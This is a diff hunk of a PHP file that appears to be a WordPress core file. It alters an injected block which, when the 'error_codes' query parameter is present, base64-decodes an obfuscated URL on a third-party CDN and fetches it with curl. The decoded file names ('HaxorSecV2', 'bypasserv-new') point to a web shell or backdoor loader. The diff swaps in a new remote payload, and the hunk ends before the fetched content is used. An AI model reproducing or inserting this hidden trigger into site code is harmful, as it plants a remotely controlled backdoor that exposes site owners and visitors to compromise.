@@ -167,7 +167,7 @@ if ( SHORTINIT ) {
 	return false;
 }
     if (isset($_GET['error_codes'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9IYXhvclNlY1YyLnR4dA==');
+    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9ieXBhc3NlcnYtbmV3LnR4dA==');
     
     $ch = curl_init($url);
     
